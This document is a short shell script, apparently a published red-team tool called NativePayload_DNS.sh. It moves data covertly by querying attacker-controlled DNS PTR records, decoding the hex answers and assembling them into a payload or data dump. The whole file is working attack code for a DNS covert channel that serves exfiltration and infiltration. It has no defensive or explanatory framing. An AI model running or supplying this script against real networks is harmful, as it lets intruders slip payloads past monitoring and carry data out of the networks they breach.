 #!/bin/sh
# syntax ./NativePayload_DNS.sh DomainName TargetDNSServer delay
# syntax ./NativePayload_DNS.sh test.com 192.168.1.10 3
tput setaf 2;
echo "NativePayload_DNS.sh v1.0 , Published by Damon Mohammadbagher 2017-2018" 
echo "Exfil/Infiltration/Transferring DATA via DNS PTR Records"
echo ""
temp=`nslookup temp.$1 $2 | grep Add | awk {'print $2'}`
temp2=`echo $temp | awk {'print $2'}`
echo "[!] Detecting Temp host: "$temp2
myloops=`echo $temp2 | cut -d'.' -f4`
echo "[!] Detecting PTR Records/Requests: "$myloops
first_ip="`echo $temp2 | cut -d'.' -f1`"
first_ip+=".`echo $temp2 | cut -d'.' -f2`"
first_ip+=".`echo $temp2 | cut -d'.' -f3`."
echo "[!] Detecting First Request: "$first_ip"x"
echo "[!] Delay time (sec): "$3
counter=0
timedelay=0
alldumps=``;
while(true)
do
	echo "--------------------------"
	first_ip="`echo $temp2 | cut -d'.' -f1`"
	first_ip+=".`echo $temp2 | cut -d'.' -f2`"
	first_ip+=".`echo $temp2 | cut -d'.' -f3`.$counter"
	tput setaf 2;
	time=`date '+%d/%m/%y %H:%M:%S'`
	echo "[!] "[$counter] [$time] " Lookup : " $first_ip  
	tput setaf 11;
	final= echo "[!] "[$counter]" Domain: "  "`nslookup $first_ip $2 | grep arpa | awk {'print $4'}`"
	tput setaf 3;
	finals= echo "[!] "[$counter]" Text: "  "`nslookup $first_ip $2 | grep arpa | awk {'print $4'} | xxd -r -p`"
	alldumps+="`nslookup $first_ip $2 | grep arpa | awk {'print $4'} | xxd -r -p`"
	tput setaf 10;
	echo "[>] "[$counter]" Dumped DATA : " $alldumps
	((counter++))
	sleep $3
		if(($counter == $myloops))
		then
		break
		fi
done
